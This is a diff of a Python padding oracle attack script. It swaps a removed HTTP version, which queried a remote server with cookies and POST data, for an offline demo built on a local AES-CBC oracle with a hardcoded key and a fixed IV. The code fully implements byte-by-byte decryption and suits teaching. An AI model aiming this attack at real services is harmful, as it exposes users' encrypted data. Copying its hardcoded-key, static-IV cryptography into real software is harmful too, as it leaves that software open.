@@ -1,58 +1,67 @@
 #! /usr/bin/python
 
 '''
-    Padding Oracle Attack implementation of this article https://not.burntout.org/blog/Padding_Oracle_Attack/
+    Padding Oracle Attack implementation without remote server
     Check the readme for a full cryptographic explanation
     Author: mpgn <martial.puygrenier@gmail.com>
     Date: 2016
 '''
 
 import argparse
-import httplib, urllib
 import re
 import binascii
 import sys
 import time
 from binascii import unhexlify, hexlify
 from itertools import cycle, izip
+from Crypto.Cipher import AES
+from Crypto import Random
 
-####################################
-# CUSTOM YOUR RESPONSE ORACLE HERE #
-####################################
+"""
+    AES-CBC
+    function encrypt, decrypt, pad, unpad)
+"""
+
+def pad(s):
+    return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
+
+def unpad(s):
+    t = s.encode("hex")
+    exe = re.findall('..',t)
+    padding = int(exe[-1], 16)
+    exe = exe[::-1]
+
+    if padding == 0 or padding > 16:
+        return 0
+    
+    for i in range(padding):
+        if int(exe[i],16) != padding:
+            return 0
+    return s[:-ord(s[len(s)-1:])]
+
+def encrypt( msg, iv):
+    raw = pad(msg)
+    key = Random.new().read( AES.block_size )
+    cipher = AES.new('V38lKILOJmtpQMHp', AES.MODE_CBC, iv )
+    return cipher.encrypt( raw ), iv
+
+def decrypt( enc, iv ):
+    decipher = AES.new('V38lKILOJmtpQMHp', AES.MODE_CBC, iv )
+    return unpad(decipher.decrypt( enc ))
+
+
+
 ''' the function you want change to adapte the result to your problem '''
-def test_validity(response,error):
-
-    try:
-        value = int(error)
-        if int(response.status) == value:
-            return 1
-    except ValueError:
-        pass  # it was a string, not an int.
-
-    # oracle repsonse with data in the DOM
-    data = response.read()
-    if data.find(error) == -1:
+def test_validity(error):
+    if error != 404:
         return 1
     return 0
 
-################################
-# CUSTOM YOUR ORACLE HTTP HERE #
-################################
-def call_oracle(host,cookie,url,post,method,up_cipher):
-    if post:
-        params = urllib.urlencode({post})
-    else:
-        params = urllib.urlencode({})
-    headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain", 'Cookie': cookie}
-    conn = httplib.HTTPConnection(host)
-    conn.request(method, url + up_cipher, params, headers)
-    response = conn.getresponse()
-    return conn, response
 
-# the exploit don't need to touch this part
-# split the cipher in len of size_block
-def split_len(seq, length):
-    return [seq[i:i+length] for i in range(0, len(seq), length)]
+def call_oracle(up_cipher, iv):
+    if decrypt( up_cipher, iv ) == 0:
+        return 404
+    return 200
 
 ''' create custom block for the byte we search'''
 def block_search_byte(size_block, i, pos, l):
@@ -66,10 +75,15 @@ def block_padding(size_block, i):
         l.append(("0" if len(hex(i+1).split('0x')[1])%2 != 0 else '') + (hex(i+1).split('0x')[1]))
     return "00"*(size_block-(i+1)) + ''.join(l)
 
+# the exploit don't need to touch this part
+# split the cipher in len of size_block
+def split_len(seq, length):
+    return [seq[i:i+length] for i in range(0, len(seq), length)]
+
 def hex_xor(s1,s2):
     return hexlify(''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(unhexlify(s1), cycle(unhexlify(s2)))))
 
-def run(cipher,size_block,host,url,cookie,method,post,error):
+def run(cipher,size_block):
     cipher       = cipher.upper()
     found        = False
     valide_value = []
@@ -78,8 +92,9 @@ def run(cipher,size_block,host,url,cookie,method,post,error):
     cipher_block = split_len(cipher, len_block)
 
     if len(cipher_block) == 1:
-        print "[-] Abort there is only one block"
-        sys.exit()  
+        print "[-] Abort there is only one block, i can't influence the IV. Tried a longer message"
+        sys.exit()
+
     #for each cipher_block
     for block in reversed(range(1,len(cipher_block))):
         if len(cipher_block[block]) != len_block:
@@ -104,7 +119,7 @@ def run(cipher,size_block,host,url,cookie,method,post,error):
                     #time.sleep(0.5)
 
                     # we call the oracle, our god
-                    connection, response = call_oracle(host,cookie,url,post,method,up_cipher)
+                    error = call_oracle(up_cipher.decode('hex'),iv)
 
                     if args.verbose == True:
                         exe = re.findall('..',cb)
@@ -115,18 +130,16 @@ def run(cipher,size_block,host,url,cookie,method,post,error):
                         sys.stdout.write("\r[+] Test [Byte %03i/256 - Block %d ]: \033[31m%s\033[33m%s\033[36m%s\033[0m" % (ct_pos, block, find_me, current, discover))
                         sys.stdout.flush()
 
-                    if test_validity(response,error):
+                    if test_validity(error):
 
                         found = True
-                        connection.close()
-                        
+                       
                         # data analyse and insert in rigth order
                         value = re.findall('..',bk)
                         valide_value.insert(0,value[size_block-(i+1)])
 
                         if args.verbose == True:
                             print ''
-                            print "[+] HTTP ", response.status, response.reason
                             print "[+] Block M_Byte : %s"% bk
                             print "[+] Block C_{i-1}: %s"% bp
                             print "[+] Block Padding: %s"% bc
@@ -145,9 +158,10 @@ def run(cipher,size_block,host,url,cookie,method,post,error):
                 print "\n[-] Error decryption failed"
                 result.insert(0, ''.join(valide_value))
                 hex_r = ''.join(result)
-                print "[+] Partial Decrypted value (HEX):", hex_r.upper()
-                padding = int(hex_r[len(hex_r)-2:len(hex_r)],16)
-                print "[+] Partial Decrypted value (ASCII):", hex_r[0:-(padding*2)].decode("hex")
+                if len(hex_r) > 0:
+                    print "[+] Partial Decrypted value (HEX):", hex_r.upper()
+                    padding = int(hex_r[len(hex_r)-2:len(hex_r)],16)
+                    print "[+] Partial Decrypted value (ASCII):", hex_r[0:-(padding*2)].decode("hex")
                 sys.exit()
             found = False
 
@@ -160,18 +174,19 @@ def run(cipher,size_block,host,url,cookie,method,post,error):
     padding = int(hex_r[len(hex_r)-2:len(hex_r)],16)
     print "[+] Decrypted value (ASCII):", hex_r[0:-(padding*2)].decode("hex")
 
+    return hex_r[0:-(padding*2)].decode("hex")
+
 if __name__ == '__main__':                           
 
     parser = argparse.ArgumentParser(description='Exploit of Padding Oracle Attack')
-    parser.add_argument('-c', "--cipher",               required=True,              help='cipher you want to decrypt')
-    parser.add_argument('-l', '--length_block_cipher',  required=True, type=int,    help='lenght of a block cipher: 8,16')
-    parser.add_argument("--host",                       required=True,              help='url example: /page=')
-    parser.add_argument('-u', "--urltarget",            required=True,              help='url example: /page=')
-    parser.add_argument('--error',                      required=True,              help='Error that oracle give us example: 404,500,200 OR in the dom example: "<h2>Padding Error<h2>"')
-    parser.add_argument('--cookie',         help='Cookie example: PHPSESSID=9nnvje7p90b507shfmb94d7',   default="")
-    parser.add_argument('--method',         help='Type methode like POST GET default GET',              default="GET")
-    parser.add_argument('--post',           help="POST data example: 'user':'value', 'pass':'value'",    default="")
+    parser.add_argument('-m', "--message",               required=True,  help='message to pown')
     parser.add_argument('-v', "--verbose",  help='debug mode, you need a large screen', action="store_true")
     args = parser.parse_args()
 
-    run(args.cipher, args.length_block_cipher, args.host, args.urltarget, args.cookie, args.method, args.post, args.error)
+    print "[+] Encrypt", args.message
+    cipher, iv = encrypt(args.message, "1234567812345678")
+    cipher_intercepted = cipher.encode("hex")
+    print "[+] %s ---> %s" % (args.message,  cipher_intercepted)
+    plaintext = decrypt(cipher, iv)
+
+    run(cipher_intercepted,16)
